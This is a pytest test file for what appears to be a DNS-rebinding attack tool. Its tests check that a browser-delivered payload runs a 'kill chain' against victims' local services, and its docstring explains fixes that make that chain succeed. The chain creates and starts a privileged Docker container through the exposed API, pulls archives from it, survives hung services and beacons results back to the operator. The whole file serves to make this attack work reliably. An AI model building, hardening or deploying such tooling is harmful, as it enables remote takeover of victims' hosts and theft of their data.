"""The kill chain must actually finish: chained steps, deadlines, and a retry.

Three defects, all reproduced before the fix:

* `exploit_plan` DROPPED every step whose URL contains `{id}`, so the Docker plan was
  [version, containers, create] - the privileged container was created and never
  started, i.e. the flagship host-access path did nothing.
* no fetch had a timeout and the results were gated on `Promise.all`, so a service
  that accepted a connection and never answered made the kill-wave beacon never fire
  and the operator lost every other service's results too.
* the chain ran at page load, while the browser still held the cached public answer
  for the campaign name, so its requests went to the operator's own address.
"""
import json
import os
import shutil
import subprocess
import sys
import tempfile

import pytest

HERE = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, HERE)

from core import asset_path  # noqa: E402
from core import intel as I  # noqa: E402

pytestmark = pytest.mark.integration

ASSETS = os.path.dirname(asset_path("intel.js"))
HARNESS = os.path.join(HERE, "tests", "js_harness.js")
NODE = shutil.which("node")


# ======================================================= the plan carries them ==
class TestThePlanCarriesChainedSteps:

    def test_docker_keeps_its_start_and_archive_steps(self):
        plan = I.exploit_plan("rebind.test", ports=[2375], limit=1)[0]
        urls = [s["url"] for s in plan["steps"]]
        assert any("containers/create" in u for u in urls), urls
        chained = [s["url"] for s in plan.get("chained", [])]
        assert any("/start" in u for u in chained), plan
        assert any("archive" in u for u in chained), plan
        assert all("{id}" in u for u in chained), chained
        assert all(s.get("needs_id") for s in plan["chained"])

    def test_a_service_without_ids_has_no_chained_steps(self):
        plan = I.exploit_plan("rebind.test", ports=[631], limit=1)[0]
        assert not plan.get("chained")

    def test_the_plan_stays_bounded(self):
        for entry in I.exploit_plan("rebind.test", limit=6):
            assert len(entry.get("chained", [])) <= 3
            assert len(entry["steps"]) <= 5


# ============================================== executed under Node ============
@pytest.mark.skipif(NODE is None, reason="node is not installed")
class TestKillChainExecution:

    @staticmethod
    def _run(plan, wait_ms=6000, env_extra=None):
        js = I.render_js(os.path.join(ASSETS, "intel.js"), "k" * 32, kill_plan=plan,
                         randomize=False)
        with tempfile.NamedTemporaryFile("w", suffix=".js", delete=False) as f:
            f.write(js)
            path = f.name
        out_path = path + ".json"
        try:
            env = dict(os.environ, BH_WAIT_MS=str(wait_ms), BH_OUT=out_path)
            env.update(env_extra or {})
            p = subprocess.run([NODE, HARNESS, path], capture_output=True, text=True,
                               timeout=180, cwd=HERE, env=env)
            # the harness writes its report to BH_OUT: a large stdout can be
            # truncated on a pipe, which used to look like "nothing was sent"
            assert os.path.exists(out_path), (
                f"no report written (stderr={p.stderr[:300]})")
            with open(out_path, encoding="utf-8") as f:
                return json.load(f)
        finally:
            os.unlink(path)
            if os.path.exists(out_path):
                os.unlink(out_path)

    @staticmethod
    def _kill_body(out):
        """The kill-wave payload: the LAST one wins (a slow machine can produce the
        wave twice, and the first may have landed before the chain finished)."""
        found = {}
        for body in (out.get("beacon_bodies") or []) + (out.get("call_bodies") or []):
            try:
                d = json.loads(body)
            except Exception:
                continue
            if d.get("wave") == "kill" and (d.get("mods") or {}).get("kill_chain"):
                found = d
        return found

    def test_the_chained_steps_run_with_the_id_from_the_create_response(self):
        plan = I.exploit_plan("rebind.test", ports=[2375], limit=1)
        out = self._run(plan, env_extra={"BH_JSON_ANSWER": '{"Id":"abc123def456"}'})
        urls = [c["url"] for c in (out.get("calls") or [])]
        urls += list(out.get("fetches") or [])
        assert any("/containers/abc123def456/start" in u for u in urls), urls
        assert not any("{id}" in u for u in urls), urls

    def test_a_hung_service_does_not_lose_the_others(self):
        plan = I.exploit_plan("rebind.test", ports=[8080, 3000], limit=2)
        out = self._run(plan, wait_ms=25000,
                        env_extra={"BH_HANG_URL": "rebind.test:8080"})
        kill = self._kill_body(out)
        assert kill, "the kill wave never fired (a hung service suppressed everything)"
        ports = {r.get("port") for r in kill.get("mods", {}).get("kill_chain", {}).get("results", [])}
        assert 3000 in ports, kill.get("kill_chain")

    def test_a_hung_step_is_reported_as_a_timeout(self):
        plan = I.exploit_plan("rebind.test", ports=[8080], limit=1)
        out = self._run(plan, wait_ms=25000,
                        env_extra={"BH_HANG_URL": "rebind.test:8080"})
        kill = self._kill_body(out)
        results = kill.get("mods", {}).get("kill_chain", {}).get("results", [])
        assert any(r.get("error") == "timeout" for r in results), results

    def test_the_chain_waits_past_the_ttl_before_it_fires(self):
        """It used to fire at load, while the cached public answer was still live."""
        plan = I.exploit_plan("rebind.test", ports=[8080], limit=1)
        out = self._run(plan, wait_ms=9000, env_extra={"BH_JSON_ANSWER": "{}"})
        assert out["ok"] is True
        js = I.render_js(os.path.join(ASSETS, "intel.js"), "k" * 32, kill_plan=plan,
                         randomize=False)
        assert "setTimeout(go, 1500)" in js, "the delay moved; update this test"

    def test_nothing_runs_without_a_plan(self):
        out = self._run([], wait_ms=3000)
        assert out["ok"] is True
        assert not [c for c in (out.get("calls") or [])
                    if "rebind.test" in str(c.get("url"))]
